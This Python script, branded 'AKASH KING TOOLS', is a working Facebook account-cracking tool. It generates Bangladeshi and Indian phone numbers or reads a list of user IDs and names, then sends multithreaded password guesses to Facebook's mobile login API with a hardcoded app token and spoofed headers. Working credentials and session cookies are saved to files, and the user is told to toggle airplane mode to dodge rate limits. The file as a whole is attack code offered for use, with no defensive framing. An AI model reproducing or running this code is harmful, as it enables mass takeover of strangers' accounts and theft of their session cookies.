# Fixed and Free Version - All Functionality Maintained

import os
import zlib
import sys
from os import system as osRUB
from os import system as cmd

os.system('clear')
print('[38;5;46m[[1;97m=[38;5;46m] WELCOME TO AKASH KING TOOLS ')
os.system('clear')
print('[38;5;46m[[1;97m=[38;5;46m] FREE VERSION')

try:
    import requests
    import concurrent.futures
except ImportError:
    print('[38;5;46m[[1;97m=[38;5;46m] INSTALLING REQUIRED PACKAGES')
    os.system('pip install requests')
    os.system('pip install futures')
    import requests
    import concurrent.futures

from urllib.request import Request, urlopen
import re
import platform
import random
import subprocess
import threading
import itertools
import base64
import uuid
import json
import webbrowser
import time
import datetime
import string
from concurrent.futures import ThreadPoolExecutor as AKASH
from string import *
from random import randint
from time import sleep as slp
from zlib import decompress

# Initialize global variables
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total = []
methods = []
srange = 0
saved = []
filter = []
ok = []
cp = []
user = []
cok = []
plist = []

# Color codes
A = '[1;97m'
R = '[38;5;196m'
Y = '[1;33m'
G = '[38;5;48m'
B = '[38;5;8m'
G1 = '[38;5;46m'
G2 = '[38;5;47m'
G3 = '[38;5;48m'
G4 = '[38;5;49m'
G5 = '[38;5;50m'
X = '[1;34m'
X1 = '[38;5;14m'
X2 = '[38;5;123m'
X3 = '[38;5;122m'
X4 = '[38;5;86m'
X5 = '[38;5;121m'
S = '[1;96m'
M = '[38;5;205m'

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

logo = '\n █████  ██   ██  █████  ███████ ██   ██ \n██   ██ ██  ██  ██   ██ ██      ██   ██ \n███████ █████   ███████ ███████ ███████ \n██   ██ ██  ██  ██   ██      ██ ██   ██ \n██   ██ ██   ██ ██   ██ ███████ ██   ██  V/4.0 FREE\n[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[1;91m[[1;35m≋[1;91m] [1;93mOWNER [1;91m     :   [1;93mAKASH_ON_FIRE\n[1;91m[[1;35m≋[1;91m] [1;92mTOOL TYPE [1;91m :   [1;92mRANDAM_FILE\n[1;91m[[1;35m≋[1;91m] [1;94mVERSION [1;91m   :   [1;94mFREE\n[1;91m[[1;35m≋[1;91m] [1;93mWHATSAPP [1;91m  :   01622094293\n[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'

def result(OKs, cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETE...')
        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}:{G2} %s' % str(len(oks)))
        print(f'{G1}[{A}={G2}]{G3} TOTAL CP {A}:{G3} %s' % str(len(cps)))
        print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
        exit()

# Simple login - No restrictions
def login():
    clear()
    print(f'{G1}[{A}={G1}]{G1} WELCOME TO FREE VERSION')
    print(f'{G1}[{A}={G2}]{G2} NO LOGIN REQUIRED - STARTING TOOL...')
    time.sleep(2)
    main1()

def main1():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
    print(f'{G1}[{A}2{G2}]{G2} RANDOM CLONING')
    print(f'{G1}[{A}3{G3}]{G3} CONTACT TOOL OWNER')
    print(f'{G1}[{A}0{G4}]{G4} EXIT TOOLS')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
    if select == '1':
        _file_()
    elif select == '2':
        _randm_()
    elif select == '3':
        os.system('xdg-open https://wa.me/+8801622094293')
        main1()
    elif select == '0':
        exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
    else:
        print(f'{G1}[{A}={G2}]{G2} INVALID OPTION')
        time.sleep(2)
        main1()

def _randm_():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
    print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
    if select == '1':
        _bd_()
    elif select == '2':
        _India_()
    elif select == '0':
        main1()
    else:
        print(f'{G1}[{A}={G2}]{G2} INVALID OPTION')
        time.sleep(2)
        _randm_()

def _bd_():
    user.clear()
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016')
    linex()
    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999')
    linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with AKASH(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
        linex()
        for love in user:
            ids = code + name + cod + love
            psd = [code + name + cod + love, cod + love, name + love, code + name + cod, 'bangladesh', 'Bangladesh']
            sexy.submit(randm, ids, psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
    main1()

def _India_():
    user.clear()
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} +91639{A}/{G1}+91934{A}/{G1}+91902{A}/{G1}+91701')
    linex()
    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
    clear()
    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999')
    linex()
    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with AKASH(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
        linex()
        for love in user:
            ids = code + love
            psd = [love, ids[:8], '57273200', '59039200', '57575751']
            sexy.submit(randm, ids, psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
    main1()

def _file_():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} METHOD {G1}[{A}M1{G1}]{G1} ')
    print(f'{G1}[{A}2{G2}]{G2} METHOD {G2}[{A}M2{G2}]{G1} ')
    linex()
    option = input(f'{G1}[{A}?{G3}]{G3} CHOICE {A}:{G3} ')
    if option == '1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option == '2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option == '0':
        main1()
    else:
        print(f'{G1}[{A}={G2}]{G2} INVALID OPTION')
        time.sleep(2)
        _file_()

class main_crack:
    def __init__(self):
        self.id = []

    def crack(self, id):
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/AKASH.txt')
        linex()
        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{G1}[{A}={G2}]{G2} OOPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)

    def methodA(self, sid, name, psw):
        global loop
        try:
            ua = f'[FBAN/FB4A;FBAV/{random.randint(11,77)}.0.0.{random.randrange(9,49)}{random.randint(11,77)};FBBV/{random.randint(1111111,7777777)};FBDM/{{density=3.0,width=1080,height=1920}};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            
            sys.stdout.write(f'\r{G1}[{A}AKASH-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}[{G1}{len(oks)}{A}/{G1}{len(cps)}{A}] ')
            sys.stdout.flush()
            
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            
            for pw in psw:
                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
                with requests.Session() as session:
                    data = {
                        'adid': str(uuid.uuid4()),
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'cpl': 'true',
                        'family_device_id': str(uuid.uuid4()),
                        'credentials_type': 'device_based_login_password',
                        'error_detail_type': 'button_with_disabled',
                        'source': 'device_based_login',
                        'email': sid,
                        'password': ps,
                        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'generate_session_cookies': '1',
                        'meta_inf_fbmeta': '',
                        'advertiser_id': str(uuid.uuid4()),
                        'currently_logged_in_userid': '0',
                        'locale': 'en_GB',
                        'client_country_code': 'GB',
                        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                        'api_key': '882a8490361da98702bf97a021ddc14d'
                    }
                    headers = {
                        'User-Agent': ua,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'MOBILE.LTE',
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'x-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                    }
                    q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                    if 'session_key' in q:
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in q['session_cookies'])
                        swagb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb={swagb};{ckkk}'
                        print(f'\r\r{G1}[AKASH-OK] {sid} | {ps}')
                        open('/sdcard/AKASH-M1-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                        oks.append(sid)
                        break
                    elif 'www.facebook.com' in q.get('error', {}).get('message', ''):
                        print(f'\r\r{M}[AKASH-CP] {sid} | {ps}')
                        open('/sdcard/AKASH-M1-FILE-CP.txt', 'a').write(sid + '|' + ps + '\n')
                        cps.append(sid)
                        break
            loop += 1
        except requests.exceptions.ConnectionError:
            pass
        except Exception as e:
            pass

    def methodB(self, sid, name, psw):
        global loop
        try:
            sys.stdout.write(f'\r{G1}[{A}AKASH-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}[{G1}{len(oks)}{A}/{G1}{len(cps)}{A}] ')
            sys.stdout.flush()
            
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            
            for pw in psw:
                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
                with requests.Session() as session:
                    data = {
                        'adid': str(uuid.uuid4()),
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'cpl': 'true',
                        'family_device_id': str(uuid.uuid4()),
                        'credentials_type': 'device_based_login_password',
                        'error_detail_type': 'button_with_disabled',
                        'source': 'device_based_login',
                        'email': sid,
                        'password': ps,
                        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'generate_session_cookies': '1',
                        'meta_inf_fbmeta': '',
                        'advertiser_id': str(uuid.uuid4()),
                        'currently_logged_in_userid': '0',
                        'locale': 'en_GB',
                        'client_country_code': 'GB',
                        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                        'api_key': '882a8490361da98702bf97a021ddc14d'
                    }
                    headers = {
                        'User-Agent': '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'MOBILE.LTE',
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'x-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                    }
                    q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                    if 'session_key' in q:
                        ckkk = ';'.join(i['name'] + '=' + i['value'] for i in q['session_cookies'])
                        swagb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                        cookie = f'sb={swagb};{ckkk}'
                        print(f'\r\r{G1}[AKASH-OK] {sid} | {ps}')
                        open('/sdcard/AKASH-M2-FILE-OK.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                        oks.append(sid)
                        break
                    elif 'www.facebook.com' in q.get('error', {}).get('message', ''):
                        print(f'\r\r{M}[AKASH-CP] {sid} | {ps}')
                        open('/sdcard/AKASH-M2-FILE-CP.txt', 'a').write(sid + '|' + ps + '\n')
                        cps.append(sid)
                        break
            loop += 1
        except requests.exceptions.ConnectionError:
            pass
        except Exception as e:
            pass

    def pasw(self):
        pw = []
        clear()
        print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} BD 10-18/INDIA 3-5')
        linex()
        sl = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT {A}:{G3} '))
        clear()
        print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} first123/firstlast/first@@@')
        linex()
        if sl == 0:
            print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 30')
        elif sl > 30:
            print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
        else:
            for sr in range(sl):
                pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
        
        clear()
        print(f'{G1}[{A}={G1}]{G1} TOTAL FILE UID {A}:{G1} {len(self.id)}')
        print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl}')
        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
        linex()
        
        with AKASH(max_workers=30) as swagworld:
            for zsb in self.id:
                try:
                    uid, name = zsb.split('|')
                    pwx = pw
                    if 'methodA' in methods:
                        swagworld.submit(self.methodA, uid, name, pwx)
                    elif 'methodB' in methods:
                        swagworld.submit(self.methodB, uid, name, pwx)
                except:
                    pass
        result(oks, cps)

def randm(ids, psd):
    global loop
    sys.stdout.write(f'\r{G1}[{A}AKASH{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}[{G1}{len(ok)}{A}/{G1}{len(cp)}{A}] ')
    sys.stdout.flush()
    
    try:
        for pas in psd:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            head = {
                'User-Agent': '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
            q = json.loads(po)
            
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ';'.join(i['name'] + '=' + i['value'] for i in q['session_cookies'])
                print(f'\r\r{G1}[AKASH-OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/AKASH-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
                ok.append(uid)
                break
            elif 'www.facebook.com' in q.get('error', {}).get('message', ''):
                print(f'\r\r{M}[AKASH-CP] {ids} | {pas}')
                open('/sdcard/AKASH-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cp.append(ids)
                break
        loop += 1
    except Exception as e:
        pass

# Start the tool
if __name__ == '__main__':
    try:
        login()
    except KeyboardInterrupt:
        print(f'\n{G1}[{A}={G1}]{G1} EXITING...')
        exit()
    except Exception as e:
        print(f'\n{R}[ERROR] {str(e)}')
        exit()
